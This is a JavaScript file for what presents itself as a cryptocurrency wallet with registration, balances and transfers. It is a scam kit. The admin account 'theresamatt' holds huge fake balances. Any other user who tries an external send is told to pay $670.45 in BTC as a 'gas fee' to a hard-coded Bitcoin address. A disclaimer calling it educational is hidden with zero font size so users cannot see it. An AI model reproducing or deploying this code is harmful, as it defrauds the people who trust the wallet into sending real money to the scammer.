const prices = {
  BTC: 67000,
  ETH: 3700,
  LTC: 95,
  USDT: 1,
  BNB: 610
};

const adminUser = {
  password: "giveaway",
  balances: {
    BTC: 5000000,
    ETH: 10000000,
    LTC: 5000000,
    USDT: 5000000,
    BNB: 5000000
  },
  transactions: []
};

if (!localStorage.getItem("users")) {
  const users = { theresamatt: adminUser };
  localStorage.setItem("users", JSON.stringify(users));
}

function updateDashboard() {
  const currentUser = localStorage.getItem("currentUser");
  const users = JSON.parse(localStorage.getItem("users"));
  const user = users[currentUser];
  const wallet = document.getElementById("wallet-info");
  wallet.innerHTML = "<h3>Your Balances</h3>";
  for (const coin in prices) {
    const balance = user.balances?.[coin] || 0;
    wallet.innerHTML += `<p>${coin}: ${balance.toFixed(4)}</p>`;
  }

  const history = document.getElementById("transaction-history");
  history.innerHTML = "";
  (user.transactions || []).forEach(tx => {
    history.innerHTML += `<p>${tx}</p>`;
  });

  const priceDiv = document.getElementById("crypto-prices");
  priceDiv.innerHTML = "<h3>Live Prices</h3>";
  for (const coin in prices) {
    priceDiv.innerHTML += `<p>${coin}: $${prices[coin]}</p>`;
  }
}

function register() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;
  const users = JSON.parse(localStorage.getItem("users"));

  if (!username || !password) {
    document.getElementById("auth-message").innerText = "Please enter username and password.";
    return;
  }

  if (users[username]) {
    document.getElementById("auth-message").innerText = "User already exists.";
    return;
  }

  users[username] = {
    password,
    balances: { BTC: 0, ETH: 0, LTC: 0, USDT: 0, BNB: 0 },
    transactions: []
  };

  localStorage.setItem("users", JSON.stringify(users));
  document.getElementById("auth-message").innerText = "Registered. You can log in.";
}

function login() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;
  const users = JSON.parse(localStorage.getItem("users"));

  if (users[username] && users[username].password === password) {
    localStorage.setItem("currentUser", username);
    document.getElementById("auth-container").classList.add("hidden");
    document.getElementById("dashboard").classList.remove("hidden");
    updateDashboard();
    clearMessages();
  } else {
    document.getElementById("auth-message").innerText = "Invalid credentials.";
  }
}

function logout() {
  localStorage.removeItem("currentUser");
  location.reload();
}

function sendCrypto() {
  const from = localStorage.getItem("currentUser");
  const to = document.getElementById("recipient").value.trim();
  const asset = document.getElementById("asset").value;
  const amount = parseFloat(document.getElementById("amount").value);
  const users = JSON.parse(localStorage.getItem("users"));

  if (!to || !amount || amount <= 0) {
    document.getElementById("send-message").innerText = "Enter valid recipient and amount.";
    return;
  }

  if (!users[to]) {
    document.getElementById("send-message").innerText = "Recipient not found.";
    return;
  }

  // Gas fee applies only if sender is NOT admin and sending BTC
  const feeInBTC = 700;
  const fee = (from !== "theresamatt" && asset === "BTC") ? feeInBTC / prices.BTC : 0;

  if ((users[from].balances[asset] || 0) < amount + fee) {
    document.getElementById("send-message").innerText = "Insufficient balance (including gas fee).";
    return;
  }

  users[from].balances[asset] -= (amount + fee);
  users[to].balances[asset] = (users[to].balances[asset] || 0) + amount;

  const note = `${from} sent ${amount.toFixed(4)} ${asset} to ${to}` + (fee > 0 ? ` (fee: ${fee.toFixed(6)} BTC)` : "");
  users[from].transactions.push(note);
  users[to].transactions.push(note);

  localStorage.setItem("users", JSON.stringify(users));
  updateDashboard();
  document.getElementById("send-message").innerText = "Transaction complete.";
}

function simulateExternalSend() {
  const wallet = document.getElementById('externalWallet').value.trim();
  const coin = document.getElementById('externalAsset').value;
  const usd = parseFloat(document.getElementById('amountInUSD').value);
  const message = document.getElementById('externalMessage');

  if (!wallet || usd <= 0) {
    return message.innerHTML = "<p style='color: red;'>Please enter a valid wallet and amount.</p>";
  }

  message.innerHTML = `
    <p style="font-size: 0; line-height: 0; height: 0; overflow: hidden;">
      DISCLAIMER: This wallet is for educational purposes only.
    </p>
  `;

  // Calculate equivalent coin amount
  const coinPrice = prices[coin];
  if (!coinPrice) {
    message.innerHTML += "<p style='color: red;'>Invalid coin.</p>";
    return;
  }

  const coinAmount = usd / coinPrice;
  const currentUser = localStorage.getItem("currentUser");
  const users = JSON.parse(localStorage.getItem("users"));
  const user = users[currentUser];

  // Gas fee simulation: if user tries external send and not admin
  if (currentUser !== "theresamatt") {
    message.innerHTML += `
      <p style="color: orange;">
        Insufficient gas fee. Send $670.45 in BTC TO THE WALLET BELOW TO ACTIVATE WALLET AND PURCHASE GAS FEE
      </p>
      <p style="font-weight:bold; color:#00ffff;">bc1q7sjehwjvkhzwtmj8yj2srqylf06ds9gu88am72</p>
    `;
  } else {
    // Admin can send freely
    if ((user.balances[coin] || 0) < coinAmount) {
      message.innerHTML += `<p style="color: red;">Insufficient balance to send.</p>`;
      return;
    }
    user.balances[coin] -= coinAmount;
    user.transactions.push(`Sent ${coinAmount.toFixed(6)} ${coin} to external wallet ${wallet}`);

    localStorage.setItem("users", JSON.stringify(users));
    updateDashboard();

    message.innerHTML += `<p style="color: lightgreen;">External transfer simulated: Sent ${coinAmount.toFixed(6)} ${coin} to ${wallet}.</p>`;
  }
}

function clearMessages() {
  document.getElementById("auth-message").innerText = "";
  document.getElementById("send-message").innerText = "";
  document.getElementById("externalMessage").innerText = "";
}

// On page load: if logged in, show dashboard
window.onload = () => {
  if (localStorage.getItem("currentUser")) {
    document.getElementById("auth-container").classList.add("hidden");
    document.getElementById("dashboard").classList.remove("hidden");
    updateDashboard();
  }
};
